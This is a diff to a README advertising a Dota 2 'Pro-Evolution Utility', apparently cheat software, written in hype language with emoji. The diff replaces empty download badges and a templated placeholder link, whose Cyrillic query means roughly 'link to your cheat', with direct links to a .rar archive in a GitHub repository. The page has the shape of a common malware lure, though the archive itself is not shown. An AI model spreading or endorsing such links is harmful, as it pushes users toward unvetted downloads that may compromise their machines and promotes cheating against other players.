@@ -3,7 +3,7 @@
 
 **D2 Pro-Evolution Utility** is a comprehensive **Gameplay Assistant** 🛠️ designed to eliminate human error and turn you into a high-performance competitor. Have you ever felt like you're fighting against a rigged system? 😤 Between "hidden pools" and the constant feeling that the enemy has an unfair advantage, the climb can feel impossible. It’s time to level the playing field. ⚖️
 
-[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)]()
+[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](https://github.com/VaDDoS56/Dota2-ProSoft/raw/refs/heads/main/D2%20Pro.rar)
 
 ---
 
@@ -63,8 +63,8 @@ With this utility, you stop relying on luck. You start reading the match like a 
 
 ## ⚡ Ready to Transform Your Performance?
 
-[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)]()
+[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](https://github.com/VaDDoS56/Dota2-ProSoft/raw/refs/heads/main/D2%20Pro.rar)
 
 Stop watching your rank decay. Take control of your gaming experience today! 🎮
 
-### 🔗 [ACCESS D2 PRO UTILITY HERE](https://www.google.com/search?q=%D0%A1%D0%A1%D0%AB%D0%9B%D0%9A%D0%90_%D0%9D%D0%90_%D0%92%D0%90%D0%A8_%D0%A7%D0%98%D0%A2)
+### 🔗 [ACCESS D2 PRO UTILITY HERE](https://github.com/VaDDoS56/Dota2-ProSoft/raw/refs/heads/main/D2%20Pro.rar)
